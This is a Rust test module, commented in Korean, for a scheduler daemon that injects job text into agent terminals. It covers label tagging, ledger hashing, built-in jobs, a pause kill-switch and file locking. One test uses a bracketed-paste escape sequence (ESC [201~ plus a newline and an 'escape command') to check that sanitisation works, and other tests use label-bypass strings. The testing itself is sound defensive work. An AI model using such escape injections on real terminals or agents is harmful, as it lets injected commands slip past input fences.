        assert_eq!(
            ensure_machine_label("다음 액션 착수", "self-wake"),
            "[schedule self-wake] 다음 액션 착수"
        );
        // 이미 라벨 있음 → 무접촉(built-in `[heartbeat] …`·`[wakeup] …` 무회귀)
        for t in [
            "[heartbeat] 일일 환경스캐닝을 시작하라",
            "[wakeup W-3f2a1c] task=next-action",
            "  [wakeup] 다음 액션 착수",             // 선행 공백
            "［전각］ 라벨",                          // 전각 대괄호도 라벨이다
            "\u{200b}[zwsp] 라벨",                    // 투명문자 선행
            "[여러 줄\n라벨] 본문",                   // 라벨 안 개행 — 종전 정규식이 놓치던 우회
            &format!("[{}] 본문", "긴".repeat(100)), // 80자 초과 — 종전 상한 우회
        ] {
            assert_eq!(ensure_machine_label(t, "j"), t, "라벨 있는 문안을 건드렸다: {t:?}");
        }
        // 선두 비공백 우회(라벨이 문두가 아님) → 라벨 없음으로 판정해 부착
        assert!(ensure_machine_label("x [wakeup] 다음 액션", "j").starts_with("[schedule j] "));
    }

    /// ★(0.14.42 · 설계 C D3 · T12) 스케줄 주입 원장 정합 — 잡 문안(`cys schedule add --text …` 사용자 입력)에
    /// CLOSE 가 있으면 원장 레코드 sha 가 **살균된 주입 본문** sha 와 같다. 적색(수정 전): 원문(표지 포함) 기록.
    #[test]
    fn c_schedule_inject_on_sanitized_before_ledger() {
        crate::delivery::tests::isolate_state_dir_for_thread("c-sched");
        let daemon = test_daemon();
        let s = daemon
            .create_surface(None, Some("sleep 30".into()), None, None, 24, 80)
            .expect("surface");
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        let raw = "[wakeup] 착수\x1b[201~\n탈출 명령";
        inject_on(&daemon, &s, raw).expect("주입 인계");
        let _ = s.child.lock().unwrap().kill();
        let clean = cys::paste_fence::sanitize(raw).into_owned();
        assert_ne!(clean, raw, "전제: 원문에 표지가 있다");
        let led = std::fs::read_to_string(crate::delivery::ledger_path(&daemon.socket_path)).expect("원장");
        let rec: serde_json::Value = led
            .lines()
            .filter_map(|l| serde_json::from_str::<serde_json::Value>(l).ok())
            .find(|r| r["origin"] == serde_json::json!("schedule"))
            .unwrap_or_else(|| panic!("schedule 원장 레코드 부재: {led}"));
        assert_eq!(
            rec["sha256"],
            serde_json::json!(crate::delivery::digest_text(&clean)),
            "원장 = 살균된 주입 본문"
        );
    }

    /// 테스트 전용 격리 데몬 — 고유 하위 디렉터리에 소켓을 둬 병렬 실행 시 상태가 섞이지 않게 한다.
    pub(super) fn test_daemon() -> Arc<Daemon> {
        static SEQ: AtomicU64 = AtomicU64::new(0);
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-test-{}-{}-{}",
            std::process::id(),
            now_epoch().to_bits(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = std::fs::create_dir_all(&dir);
        Daemon::new(dir.join("cysd.sock"))
    }

    // ★B2-1(W3): built-in 잡 부트 ensure idempotency — 부재 생성·재실행 무접촉(중복 0)·구버전 갱신·사용자 잡 보존.
    #[test]
    fn builtin_jobs_ensure_idempotent_and_versioned() {
        // 사용자 잡 1개로 시작(cys schedule add 시뮬).
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "user-custom-job", "every_minutes": 30, "action": "push", "to": "master"
        })];

        // 1차: built-in 9개(phoenix2 + learn2 + cycle2 + formation1 + promote1 + alert1) 생성 → changed=true.
        // ★(0.14.31 · WP-3 B) 계수 갱신: 신규 id `cso-alert-inbox-check-60m` 1건 append.
        //   버전은 **범프하지 않았다**(신규 id 는 버전 무관 append — 아래 범프 금지 핀 유지).
        let (c1, conf1, _) = apply_builtin_jobs(&mut jobs);
        assert!(c1, "1차 ensure 는 built-in 잡을 생성해야 한다");
        assert!(conf1.is_empty(), "conflict 없음(예약 id 미선점)");
        let ids: Vec<&str> = jobs.iter().filter_map(|j| j["id"].as_str()).collect();
        assert!(ids.contains(&"phoenix-snapshot-6h") && ids.contains(&"phoenix-drill-weekly"));
        assert!(
            ids.contains(&"learn-ttl-audit") && ids.contains(&"fleet-digest"),
            "learn gaps C12③ 잡 2종 생성"
        );
        assert!(
            ids.contains(&"cycle-autopilot-tick") && ids.contains(&"cycle-verifier-watchdog"),
            "R6 W0-4/W0-5 cycle 잡 2종 생성"
        );
        assert!(
            ids.contains(&"formation-heartbeat"),
            "T9 P3-1 ⓑ 상비편성 심박 잡 생성"
        );
        assert!(
            ids.contains(&"ceo-promote-pending-tick"),
            "T10 P3-2 대기형 승격 집행 틱 잡 생성"
        );
        assert!(ids.contains(&"user-custom-job"), "사용자 잡은 보존돼야 한다");
        assert_eq!(jobs.len(), 10, "사용자1 + built-in9");
        // 주기 정합(typed): snapshot=6h(360), drill=7일(10080), audit=일(1440), digest=7일(10080),
        // cycle tick=매분(1), verifier watchdog=10분(10), formation heartbeat=10분(10),
        // ceo promote tick=10분(10).
        let period = |id: &str| {
            jobs.iter()
                .find(|j| j["id"].as_str() == Some(id))
                .and_then(|j| j["every_minutes"].as_u64())
        };
        assert_eq!(period("phoenix-snapshot-6h"), Some(360), "snapshot 6h");
        assert_eq!(period("phoenix-drill-weekly"), Some(10080), "drill 7일");
        assert_eq!(period("learn-ttl-audit"), Some(1440), "learn audit 일 1회");
        assert_eq!(period("fleet-digest"), Some(10080), "fleet digest 주 1회");
        assert_eq!(period("cycle-autopilot-tick"), Some(1), "cycle tick 매분");
        assert_eq!(period("cycle-verifier-watchdog"), Some(10), "verifier watchdog 10분");
        assert_eq!(period("formation-heartbeat"), Some(10), "formation heartbeat 10분");
        assert_eq!(period("ceo-promote-pending-tick"), Some(10), "promote 집행 틱 10분");
        assert_eq!(period("cso-alert-inbox-check-60m"), Some(60), "CSO alert inbox 점검 60분");
        assert!(ids.contains(&"cso-alert-inbox-check-60m"), "WP-3 B 60분 점검 잡 생성");
        // ★T9(P3-1 ⓑ) 상비편성 심박 계약 핀: command 레인(매 틱 master stdin 무주입) ·
        //   base_only(부서 데몬 복제 실행 차단 — fire 관문과 쌍) · --force-surface 금지
        //   (주기 잡 스팸 계약 javis_formation._surface) · ensure 호출 실재.
        {
            let fh = jobs
                .iter()
                .find(|j| j["id"].as_str() == Some("formation-heartbeat"))
                .unwrap();
            assert_eq!(fh["action"].as_str(), Some("command"), "심박은 command 레인 핀");
            assert_eq!(fh["base_only"].as_bool(), Some(true), "심박은 base_only 핀");
            let cmd = fh["command"].as_str().unwrap();
            assert!(
                cmd.contains("javis_formation.py") && cmd.contains("ensure"),
                "심박 command 에 formation ensure 부재"
            );
            assert!(
                !cmd.contains("--force-surface"),
                "주기 잡에 --force-surface 금지(매 틱 토스트 스팸 계약)"
            );
        }
        // ★T10(P3-2) 대기형 승격 집행 틱 계약 핀: command 레인(master stdin 무주입) ·
        //   base_only(부서 데몬 복제 실행 = 동시 승격·단일소유 위반 차단 — fire 관문과 쌍) ·
        //   role-less 주체(env -u CYS_ROLE — 단일소유 가드 무접촉의 기계 보장) ·
        //   집행 레인이므로 --request-only(신호 레인 전용 인자) 금지.
        {
            let pt = jobs
                .iter()
                .find(|j| j["id"].as_str() == Some("ceo-promote-pending-tick"))
                .unwrap();
            assert_eq!(pt["action"].as_str(), Some("command"), "집행 틱은 command 레인 핀");
            assert_eq!(pt["base_only"].as_bool(), Some(true), "집행 틱은 base_only 핀");
            let cmd = pt["command"].as_str().unwrap();
            assert!(
                cmd.contains("promote-if-pending"),
                "집행 틱 command 에 promote-if-pending 부재"
            );
            assert!(
                !cmd.contains("--request-only"),
                "집행 틱에 --request-only 금지(그건 신호 레인 — 집행은 대기형)"
            );
            assert!(
                cmd.contains("env -u CYS_ROLE"),
                "집행 틱은 role-less 주체 핀(env -u CYS_ROLE)"
            );
        }
        // ★T9(R3-P03-3) 범프 금지 핀: 신규 id 는 버전 무관 append 라 범프가 불요하고, 범프는
        //   기존 builtin 항목을 코드 정의로 통째 교체해 **운영자 수기 편집을 무언 소실**시킨다.
        //   builtin 잡 '내용' 변경으로 범프가 정말 필요해지면 이 핀을 의식적으로 함께 고치라
        //   (그 커밋이 곧 소실 고지다).
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "BUILTIN_JOBS_VERSION 무단 범프 금지(T9)");
        // ★크리틱 B3 ① 회귀 핀: cycle 잡 2종은 push 가 아니라 command 레인이어야 한다
        //   (push 면 매분 master stdin 주입 폭주 + R-CLI-4 정확일치 게이트와 충돌).
        for id in ["cycle-autopilot-tick", "cycle-verifier-watchdog"] {
            let j = jobs.iter().find(|j| j["id"].as_str() == Some(id)).unwrap();
            assert_eq!(j["action"].as_str(), Some("command"), "{id} 는 command 레인 핀");
            assert!(j.get("to").is_none() && j.get("text").is_none() && j.get("text_command").is_none(),
                "{id} 는 push 계열 필드(to/text/text_command)를 갖지 않는다");
            // ★크리틱 B3 ② 회귀 핀: live 승격을 잡 문자열(env 접두)에 심지 않는다 —
            //   버전 범프 때 코드 정의 교체로 shadow 무언 회귀하는 채널이기 때문.
            let cmd = j["command"].as_str().unwrap();
            assert!(!cmd.contains("CYS_AUTOPILOT_MODE"),
                "{id} command 에 모드 env 접두 금지(파일 채널 STATE_DIR/mode 가 정본)");
        }

        // 2차: 동버전 재실행 → 무접촉(changed=false·중복 0).
        let (c2, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "동버전 재실행은 무접촉(변경 없음)이어야 한다");
        let snap_count = jobs
            .iter()
            .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .count();
        assert_eq!(snap_count, 1, "재실행에도 중복 생성 0");
        assert_eq!(jobs.len(), 10, "중복 없이 10개 유지");

        // 3차: 구버전(마커=0) 항목이 있으면 갱신(교체) → changed=true, 여전히 중복 0.
        for j in jobs.iter_mut() {
            if j["id"].as_str() == Some("phoenix-snapshot-6h") {
                j["_builtin_version"] = json!(0); // 구버전 강제
                j["every_minutes"] = json!(99999); // 사용자가 못 고치는 드리프트 시뮬
            }
        }
        let (c3, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(c3, "구버전 항목은 갱신돼야 한다");
        let refreshed = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(
            refreshed["_builtin_version"].as_u64(),
            Some(BUILTIN_JOBS_VERSION),
            "버전업 갱신"
        );
        assert_eq!(
            refreshed["every_minutes"].as_u64(),
            Some(360),
            "갱신은 코드 정의(360)로 복원 — 드리프트 치유"
        );
        assert_eq!(
            jobs.iter()
                .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
                .count(),
            1,
            "갱신 후에도 중복 0"
        );
    }

    // ★codex W3 major: 사용자가 예약 id(phoenix-snapshot-6h)를 마커 없이 선점하면 built-in ensure 가
    //   교체하지 않고 보존+conflict 경고해야 한다(B2-1 사용자 잡 보존 계약).
    #[test]
    fn builtin_ensure_preserves_user_job_on_reserved_id() {
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "phoenix-snapshot-6h",           // 사용자가 예약 id 선점(_builtin 마커 없음)
            "every_minutes": 5, "action": "push", "to": "master", "text": "USER OWN SNAPSHOT"
        })];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        // snapshot id 는 conflict 로 보존, drill 은 신규 생성.
        assert!(conflicts.contains(&"phoenix-snapshot-6h".to_string()), "예약 id 충돌 보고");
        let snap = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(snap["text"].as_str(), Some("USER OWN SNAPSHOT"), "사용자 잡 내용 보존(교체 금지)");
        assert_eq!(snap["every_minutes"].as_u64(), Some(5), "사용자 주기 보존");
        assert!(snap.get("_builtin").is_none(), "사용자 잡에 built-in 마커 미주입");
        assert_eq!(
            jobs.iter().filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h")).count(),
            1,
            "충돌 id 중복 생성 0"
        );
        // drill 은 마커 없는 선점이 없으므로 정상 생성(changed=true).
        assert!(changed, "drill 신규 생성으로 changed");
        assert!(jobs.iter().any(|j| j["id"].as_str() == Some("phoenix-drill-weekly")));
    }

    /// (learn gaps C12③) pack seed(cysjavis-pack/schedule.json)의 마커 잡 ↔ builtin_jobs()
    /// 코드 정의 동기 핀 — 드리프트하면 R-CLI-4 게이트가 seed 사본 text_command 를 거부해
    /// 잡이 무음 실패한다(산문→코드 대칭 핀). learn 잡 2종 등재도 함께 박제.
    #[test]
    fn pack_seed_marked_jobs_match_builtin_defs() {
        let seed: serde_json::Value =
            serde_json::from_str(include_str!("../../../cysjavis-pack/schedule.json"))
                .expect("seed schedule.json 파싱");
        let builtins = builtin_jobs();
        let mut checked = 0;
        for j in seed["jobs"].as_array().expect("seed jobs 배열") {
            if j.get("_builtin").is_none() {
                continue; // 마커 없는 seed 잡(owner-report 등)은 코드 소유가 아니다
            }
            let id = j["id"].as_str().unwrap_or("?");
            let b = builtins
                .iter()
                .find(|b| b.get("id") == j.get("id"))
                .unwrap_or_else(|| panic!("seed 마커 잡 '{id}' 이 builtin_jobs() 에 없음"));
            assert_eq!(j, b, "seed '{id}' ↔ builtin_jobs() 정의 드리프트");
            checked += 1;
        }
        assert!(checked >= 2, "learn 잡 2종(learn-ttl-audit·fleet-digest)이 seed 에 등재돼야 한다");
        // R-CLI-4: 코드 소유 text_command 는 게이트가 신뢰해야 발화된다.
        for id in ["learn-ttl-audit", "fleet-digest"] {
            let cmd = builtins
                .iter()
                .find(|b| b["id"].as_str() == Some(id))
                .and_then(|b| b["text_command"].as_str())
                .expect("text_command 존재");
            assert!(is_trusted_builtin_text_command(cmd), "'{id}' text_command 게이트 신뢰");
        }
    }

    // ★T9(R3-P03-3): base_only 단일 관문 판정 — 4형상(base/dept × base_only on/off).
    //   fire() 진입부가 이 순수 판정을 그대로 소비한다(스케줄 틱·run_now·핫리로드 전 경로 커버).
    #[test]
    fn base_only_gate_blocks_only_dept_sockets() {
        let mut bj = job(None, &[]);
        bj.base_only = true;
        let mut nj = job(None, &[]);
        nj.base_only = false;
        let base_sock = std::path::Path::new("/tmp/state/cys/cys.sock");
        let dept_sock = std::path::Path::new("/tmp/state/cys-dept-dept-1/cys.sock");
        assert!(
            base_only_blocked(&bj, dept_sock),
            "base_only 잡이 부서 소켓에서 차단되지 않는다(복제 실행 — 단일소유 위반)"
        );
        assert!(
            !base_only_blocked(&bj, base_sock),
            "base_only 잡이 base 소켓에서 오차단(심박 사망 — 자가치유 경로 절단)"
        );
        assert!(
            !base_only_blocked(&nj, dept_sock),
            "일반 잡이 부서 소켓에서 오차단(부서 스케줄 회귀)"
        );
        assert!(!base_only_blocked(&nj, base_sock), "일반 잡 base 소켓 회귀");
        // Windows named pipe 부서 소켓도 동일 판정(is_dept_socket 은 경로 성분 기반).
        let pipe = std::path::Path::new(r"\\.\pipe\cys-dept-dept-2");
        assert!(base_only_blocked(&bj, pipe), "named pipe 부서 소켓 미판별");
    }

    // ★T9: base_only 는 추가-전용 스키마(#[serde(default)]) — 구 파일(필드 부재)=false 로 로드,
    //   명시 true 는 보존된다(부서 복제 파일에서도 판정 근거가 살아남는 근거).
    #[test]
    fn base_only_serde_default_is_false() {
        let old: Job = serde_json::from_value(json!({
            "id": "legacy", "action": "push", "to": "master"
        }))
        .expect("구 스키마(필드 부재) 역직렬화");
        assert!(!old.base_only, "필드 부재는 false(구 파일 호환)여야 한다");
        let new: Job = serde_json::from_value(json!({
            "id": "fh", "action": "command", "command": "true", "base_only": true
        }))
        .expect("신 스키마 역직렬화");
        assert!(new.base_only, "명시 true 소실 — 관문 판정 근거 붕괴");
    }

    #[test]
    fn run_now_is_frozen_while_paused() {
        // 회귀 가드 (T4-15 kill-switch 비대칭 차단): pause 중이면 run_now도 발화하지 않아야 한다.
        // scheduler_tick·deliver_queued는 paused에서 즉시 return하는데, run_now만 게이트가 없으면
        // 누구든 `cys schedule run-now <id>`로 kill-switch를 우회해 정지된 에이전트 stdin에
        // 과업을 주입(또는 fresh surface 기동)할 수 있다. 게이트는 job 조회·fire spawn보다
        // 먼저 막아야 한다 — 존재하지 않는 job id를 줘도 'paused' 거절이 먼저 와야 한다.
        let daemon = test_daemon();
        daemon.paused.store(true, Ordering::Relaxed);
        let err = run_now(&daemon, "no-such-job-xyz")
            .expect_err("paused 중 run_now는 발화를 거절(Err)해야 한다");
        assert!(
            err.contains("paused"),
            "거절 사유는 kill-switch(paused)여야 한다 — got: {err}"
        );
    }

    #[test]
    fn run_now_passes_gate_when_not_paused() {
        // 대칭 확인: pause가 아니면 게이트를 통과해 정상 조회 경로로 진행한다(여기선 job 부재 →
        // 'no job' 에러). paused 에러가 아니어야 게이트가 정상(running)임이 증명된다.
        let daemon = test_daemon();
        assert!(!daemon.paused.load(Ordering::Relaxed));
        let err = run_now(&daemon, "no-such-job-xyz")
            .expect_err("부재 job은 'no job' 에러여야 한다");
        assert!(
            !err.contains("paused"),
            "running 상태에서 paused 게이트가 잘못 발동하면 안 된다 — got: {err}"
        );
        assert!(err.contains("no job"), "게이트 통과 후 조회 경로 에러여야 한다 — got: {err}");
    }

    fn job(time: Option<&str>, days: &[&str]) -> Job {
        Job {
            id: "t".into(),
            time: time.map(|s| s.to_string()),
            every_minutes: None,
            at: None,
            close_after_secs: None,
            days: days.iter().map(|s| s.to_string()).collect(),
            action: "push".into(),
            to: None,
            text: None,
            text_command: None,
            command: None,
            if_absent: None,
            fresh: false,
            base_only: false,
            via_queue: false,
            launch: None,
        }
    }

    /// ★불변식 박제 (절대지침 — master 5분 주기 보고 하트비트):
    /// ★P2-2 ⑥ 회귀: 첫 가동(상태 파일 부재)에서 주기 잡이 **동시에 만기**가 되면 안 된다.
    /// 그 상태의 실제 피해는 두 갈래다 — 마스터가 있으면 큐 폭탄(폭주 결함군), 없으면
    /// `if_absent: skip` 으로 전부 소인돼 다음 주기까지 침묵. 시드 후에는 어느 잡도 즉시 만기가
    /// 아니어야 한다(다음 주기부터 정상 리듬).
    #[test]
    fn first_run_seeding_prevents_simultaneous_due() {
        let now = 1_700_000_000i64;
        let builtin = builtin_jobs();
        let intervals: Vec<u64> = builtin
            .iter()
            .filter_map(|j| j.get("every_minutes").and_then(|v| v.as_u64()))
            .collect();
        assert!(intervals.len() >= 2, "주기 잡이 여럿이어야 이 회귀가 의미 있다");
        // 시드 이전(last_fired=0): 전부 즉시 만기 — 이것이 결함 상태다.
        assert!(intervals.iter().all(|m| interval_due(Some(*m), 0, now)));
        // 시드 이후(last_fired=now): 어느 것도 즉시 만기가 아니다.
        assert!(intervals.iter().all(|m| !interval_due(Some(*m), now, now)));
        // 리듬은 유지된다 — 각자 자기 주기가 지나면 발화.
        for m in intervals {
            assert!(interval_due(Some(m), now, now + (m as i64) * 60));
        }
    }

    /// ★★감사 확정 회귀(앵커 ①③ 동시 방어): 디스크 영속이 실패해도
    ///  ①전 주기 잡이 30초마다 재발화하지 않고(폭주) ②영원히 침묵하지도 않는다(자가치유 전멸).
    /// 메모리 오버레이가 그 둘 사이의 유일한 올바른 상태(정확한 간격)를 유지한다.
    #[test]
    fn memory_overlay_keeps_interval_when_disk_write_fails() {
        // 오버레이는 프로세스 전역이라 이 테스트 전용 키를 쓴다(다른 테스트와 간섭 금지).
        let id = "test-overlay-job";
        let now = 1_700_000_000i64;
        mem_record(id, now);
        let mut st = ScheduleState::default();
        assert!(st.last_fired.is_empty());
        mem_merge_into(&mut st);
        assert_eq!(st.last_fired.get(id).copied(), Some(now), "메모리 기록이 복원되어야 한다");

        // 간격 의미가 유지된다 — 방금 발화한 잡은 즉시 만기가 아니다(폭주 차단).
        assert!(!interval_due(Some(360), st.last_fired[id], now));
        // 그리고 주기가 지나면 정상 발화한다(침묵 차단).
        assert!(interval_due(Some(360), st.last_fired[id], now + 360 * 60));

        // 디스크가 더 최신이면 디스크가 이긴다(정상 경로에서 오버레이가 과거를 되살리지 않는다).
        let mut st2 = ScheduleState::default();
        st2.last_fired.insert(id.to_string(), now + 10_000);
        mem_merge_into(&mut st2);
        assert_eq!(st2.last_fired[id], now + 10_000);
    }

    /// 원자쓰기 회귀: 저장은 tmp+rename+fsync 이고 **결과를 반환**한다(exists() 로 영속을
    /// 오판하지 않는다). 반쪽 파일이 남으면 다음 tick 이 손상 격리→재시드 루프로 간다.
    #[test]
    fn save_state_is_atomic_and_reports_failure() {
        let dir = std::env::temp_dir().join(format!("cys-sched-save-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("schedule_state.json");
        let mut st = ScheduleState::default();
        st.last_fired.insert("j".into(), 123);
        assert!(save_state_to(&path, &st).is_ok());
        let back: ScheduleState =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(back.last_fired.get("j").copied(), Some(123));
        // tmp 잔재 없음(rename 으로 넘어갔다).
        assert!(!path.with_extension("json.tmp").exists());
        // 쓸 수 없는 경로는 **정직하게 Err** — exists() 로 영속을 오판하던 결함의 회귀 핀.
        let bad = dir.join("no-such-dir").join("schedule_state.json");
        assert!(save_state_to(&bad, &st).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// interval_due는 마지막 발화 후 every_minutes분 경과 시에만 true. 0·None은 비활성.
    #[test]
    fn interval_due_fires_every_n_minutes() {
        let base = 1_000_000_000i64; // 임의 epoch
        // 5분 주기: 마지막 발화 직후엔 false, 정확히 300초 경과 시 true
        assert!(!interval_due(Some(5), base, base));
        assert!(!interval_due(Some(5), base, base + 299));
        assert!(interval_due(Some(5), base, base + 300));
        assert!(interval_due(Some(5), base, base + 600));
        // 최초(last_fired=0)는 즉시 발화 (epoch 차가 간격보다 큼)
        assert!(interval_due(Some(5), 0, base));
        // 비활성: None·0은 항상 false (상시발화 방지)
        assert!(!interval_due(None, 0, base));
        assert!(!interval_due(Some(0), 0, base));
    }

    #[test]
    fn schedule_for_daily_when_no_days() {
        // days 비면 매일 발화 — 임의 날짜에 Some
        let j = job(Some("09:00"), &[]);
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        assert!(schedule_for(&j, d).is_some());
    }

    #[test]
    fn schedule_for_respects_weekday_filter() {
        // 2026-06-12는 금요일(Friday)
        let friday = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        assert_eq!(friday.weekday(), chrono::Weekday::Fri);
        // 금요일 포함 → Some
        assert!(schedule_for(&job(Some("09:00"), &["fri"]), friday).is_some());
        // 대소문자 무관 매칭
        assert!(schedule_for(&job(Some("09:00"), &["FRI"]), friday).is_some());
        // 다른 요일만 지정 → None
        assert!(schedule_for(&job(Some("09:00"), &["mon", "tue"]), friday).is_none());
    }

    #[test]
    fn schedule_for_invalid_or_missing_time() {
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        // time 미제공 → None (원샷 at job이 아닌 한 발화 불가)
        assert!(schedule_for(&job(None, &[]), d).is_none());
        // 잘못된 시각 포맷 → None
        assert!(schedule_for(&job(Some("9am"), &[]), d).is_none());
        assert!(schedule_for(&job(Some("25:00"), &[]), d).is_none());
        assert!(schedule_for(&job(Some("12:60"), &[]), d).is_none());
    }

    #[test]
    fn schedule_for_time_ordering_within_day() {
        // 같은 날 더 늦은 시각은 더 큰(또는 같은) epoch — 단조성
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        let early = schedule_for(&job(Some("08:00"), &[]), d).unwrap();
        let late = schedule_for(&job(Some("20:00"), &[]), d).unwrap();
        assert!(late > early);
    }

    #[test]
    fn recurring_fresh_without_ttl_gets_default_reap() {
        // 회귀 가드: 반복(time) + fresh + close_after_secs 미설정 job은 발화마다 유일 역할의
        // 새 surface를 만든다. 회수 트리거가 없으면 24/365 데몬에서 surface·roles·fd가
        // 단조 증가(누수)한다. effective_close_ttl이 기본 TTL을 부여해 회수를 보장해야 한다.
        let mut j = job(Some("09:00"), &[]);
        j.fresh = true;
        assert_eq!(
            effective_close_ttl(&j),
            Some(FRESH_RECURRING_DEFAULT_TTL_SECS),
            "반복 fresh job이 TTL 없이 누수되면 안 된다 — 기본 TTL로 회수돼야 한다"
        );
        // every_minutes 반복 fresh job도 동일하게 기본 TTL을 받아야 한다(at None인 반복형).
        let mut e = job(None, &[]);
        e.every_minutes = Some(5);
        e.fresh = true;
        assert_eq!(
            effective_close_ttl(&e),
            Some(FRESH_RECURRING_DEFAULT_TTL_SECS),
            "every_minutes fresh job도 누수 차단 기본 TTL을 받아야 한다"
        );
    }

    #[test]
    fn explicit_close_after_secs_takes_precedence() {
        // 운영자가 명시한 close_after_secs는 항상 우선 (반복·원샷 무관, 0도 존중)
        let mut recurring = job(Some("09:00"), &[]);
        recurring.fresh = true;
        recurring.close_after_secs = Some(42);
        assert_eq!(effective_close_ttl(&recurring), Some(42));

        let mut oneshot = job(None, &[]);
        oneshot.at = Some(1_900_000_000);
        oneshot.fresh = true;
        oneshot.close_after_secs = Some(7);
        assert_eq!(effective_close_ttl(&oneshot), Some(7));

        // 0 = 즉시 close 의도 — 기본값으로 덮어쓰지 않는다
        recurring.close_after_secs = Some(0);
        assert_eq!(effective_close_ttl(&recurring), Some(0));
    }

    #[test]
    fn oneshot_fresh_without_ttl_keeps_legacy_none() {
        // 원샷(at)+fresh는 1회뿐이라 무한 누적이 없다 — 기존 동작(자동 close 없음) 보존.
        // 반복 경로만 누수이므로 수정은 반복에 국한한다(외과적 최소 변경).
        let mut oneshot = job(None, &[]);
        oneshot.at = Some(1_900_000_000);
        oneshot.fresh = true;
        assert_eq!(effective_close_ttl(&oneshot), None);
    }

    fn sched_dir(tag: &str) -> PathBuf {
        static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
        let n = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-a11-{tag}-{}-{}-{n}", std::process::id(), now_epoch() as u64));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// ★(성찰 A11) **잠금 없는 병렬 writer 가 없다** — writer 셋이 각자 잠금 아래에서
    /// 읽기→추가→원자 치환을 반복하는 동안 독립 reader 는 언제나 파싱 가능한 문서를 보고,
    /// 끝난 뒤 문서에는 **모든 writer 의 모든 추가**가 남아 있다(읽기와 치환 사이에 낀 추가가
    /// 옛 문서로 덮이지 않는다 = 완료된 `cys schedule add` 소멸 없음).
    #[test]
    fn schedule_writers_serialize_under_the_lock_and_no_add_is_lost() {
        let dir = sched_dir("writers");
        let path = dir.join("schedule.json");
        std::fs::write(&path, r#"{"jobs": []}"#).unwrap();
        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let bad_reads = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let reader = {
            let (path, stop, bad) = (path.clone(), stop.clone(), bad_reads.clone());
            std::thread::spawn(move || {
                let mut reads = 0usize;
                while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                    if let Ok(c) = std::fs::read_to_string(&path) {
                        reads += 1;
                        if serde_json::from_str::<serde_json::Value>(&c).is_err() {
                            bad.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                        }
                    }
                    std::thread::yield_now();
                }
                reads
            })
        };
        const WRITERS: usize = 3;
        const ADDS: usize = 25;
        let writers: Vec<_> = (0..WRITERS)
            .map(|w| {
                let path = path.clone();
                std::thread::spawn(move || {
                    for i in 0..ADDS {
                        let _lock = ScheduleFileLock::acquire(&path).expect("writer 잠금");
                        let mut root: serde_json::Value =
                            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
                        root["jobs"].as_array_mut().unwrap().push(json!({
                            "id": format!("w{w}-{i}"), "action": "push", "via_queue": true,
                            "to": "master", "text": "x", "every_minutes": 60}));
                        assert!(write_schedule_atomic(&path, &root), "원자쓰기 실패");
                        std::thread::yield_now();
                    }
                })
            })
            .collect();
        for w in writers {
            w.join().unwrap();
        }
        stop.store(true, std::sync::atomic::Ordering::Relaxed);
        let reads = reader.join().unwrap();
        assert!(reads > 0, "reader 가 한 번도 읽지 못했다");
        assert_eq!(bad_reads.load(std::sync::atomic::Ordering::Relaxed), 0,
            "reader 가 파싱 불가한(찢긴) schedule.json 을 봤다");
        let root: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["jobs"].as_array().unwrap().len(), WRITERS * ADDS,
            "잠금 아래의 추가가 다른 writer 의 치환에 덮여 사라졌다");
        // 잠금 디렉터리는 전부 해제됐고 tmp 잔재도 없다.
        assert!(!ScheduleFileLock::lock_dir_for(&path).exists(), "잠금이 해제되지 않았다");
        let leftovers: Vec<_> = std::fs::read_dir(&dir).unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().ends_with(".tmp"))
            .collect();
        assert!(leftovers.is_empty(), "tmp 잔재: {leftovers:?}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// ★(성찰 A11) 핫리로드(쓰기 모드)는 잠금을 **기다리고**, 읽기 전용 로더는 잠금 아래에서도
    /// **기다리지 않는다**(CQS) — 그리고 읽기 전용은 파일을 바꾸지 않는다(구 표현 그대로).
    #[test]
    fn hot_reload_waits_for_the_writer_lock_but_read_only_never_does_and_never_writes() {
        let dir = sched_dir("cqs");
        let path = dir.join("schedule.json");
        let legacy = r#"{"jobs": [{"id": "j", "action": "push", "via_queue": true, "to": "master",
            "text": "x", "every_minutes": 60}]}"#;
        std::fs::write(&path, legacy).unwrap();
        // 검체가 잠금을 쥔다(= CLI 가 쓰는 중).
        let held = ScheduleFileLock::acquire(&path).expect("잠금");
        // 읽기 전용: 즉시 돌아오고 파일은 바이트 동일.
        let t0 = std::time::Instant::now();
        let jobs = load_jobs_at(&path, LoadMode::ReadOnly);
